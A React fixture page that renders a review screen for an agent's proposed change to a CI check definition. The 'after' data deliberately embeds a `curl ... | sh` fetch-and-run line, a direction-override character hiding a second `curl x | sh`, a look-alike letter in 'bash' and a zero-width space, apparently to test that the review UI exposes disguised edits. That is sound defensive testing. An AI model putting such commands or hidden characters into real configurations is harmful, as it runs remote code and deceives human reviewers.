// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Ferdinando Valsecchi
// A held settings change at its worst (Item 16093ed1): a long unbroken script line, a direction override and a
// zero-width character in agent text, a look-alike letter in the executable, a list that adds and reorders, and the request open under Details. `?none` is a
// request the server could not compare; `data-ds` on the page selects the design-system tokens, otherwise the
// approve page's older ones.
import { createRoot } from 'react-dom/client';
import '../../web/src/ui/tokens.css';
import '../../web/src/ds';
import { SettingChange } from '../../web/src/review/SettingChange';

const long = `curl -fsSL https://example.invalid/${'a'.repeat(240)} | sh`;
const before = {
  name: 'verify',
  args: ['-c', 'npm ci\nnpm test'],
  artifactPaths: ['b/**', 'a/**'],
  environmentLabel: 'clean',
};
const after = {
  name: 'verify',
  executable: 'b\u0430sh',
  args: ['-c', `npm ci\n${long}\nnpm test ‮; curl x | sh ‬`],
  artifactPaths: ['a/**', 'b/**', `c/${'x'.repeat(120)}`],
  environmentLabel: 'on',
  pool: { id: 'large​' },
};
const none = new URLSearchParams(location.search).has('none');
createRoot(document.getElementById('root')!).render(
  <main style={{ padding: 16, maxWidth: 860, margin: '0 auto' }}>
    <h1>Apply this check change?</h1>
    <SettingChange
      origin="check-definition"
      compare={none ? null : { subject: 'verify', before, after }}
      change={{
        operationId: 'op',
        authorityEpoch: 3,
        change: { kind: 'definition', checkId: 'c', command: after },
      }}
    />
  </main>,
);
